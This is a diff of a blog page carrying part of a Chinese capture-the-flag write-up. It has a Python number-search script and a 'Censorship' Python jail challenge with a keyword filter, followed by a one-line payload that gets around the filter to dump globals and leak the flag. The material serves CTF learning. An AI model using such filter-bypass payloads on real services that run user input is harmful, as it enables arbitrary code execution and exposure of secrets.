+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>(<span class="params">a1</span>):</span><br><span class="line">    <span class="keyword">if</span> a1 &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 % <span class="number">3</span> != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 % <span class="number">5</span> != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 % <span class="number">7</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> a1 % <span class="number">109</span> == <span class="number">55</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check2</span>(<span class="params">a1</span>):</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a1:</span><br><span class="line">        v2 += a1 &amp; <span class="number">1</span></span><br><span class="line">        a1 &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">16</span> &lt; v2 &lt;= <span class="number">26</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">        <span class="keyword">if</span> check1(i) <span class="keyword">and</span> check2(i):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> ((i &amp; <span class="number">1</span>) != <span class="number">0</span> <span class="keyword">and</span> (i!= <span class="number">1</span>)):</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">s() <span class="comment">#输出前两个数</span></span><br><span class="line">a() <span class="comment">#输出第三个数</span></span><br></pre></td></tr></table></figure>
+
+<p>bear和volcano的数值一样。</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="Censorship"><a href="#Censorship" class="headerlink" title="Censorship"></a>Censorship</h1><p>给了一个main.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> [flag]:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = <span class="built_in">ascii</span>(<span class="built_in">input</span>(<span class="string">&quot;Give code: &quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;e&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;t&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;\\&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;invalid input&quot;</span>)</span><br><span class="line">            <span class="built_in">exec</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(err)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以执行python的命令,但是不能有<code>flag</code>,<code>e</code>,<code>t</code>，flag是被定义的但是print里有t没有办法回显，可以用python的内置函数获得print。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -1467,7 +1438,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
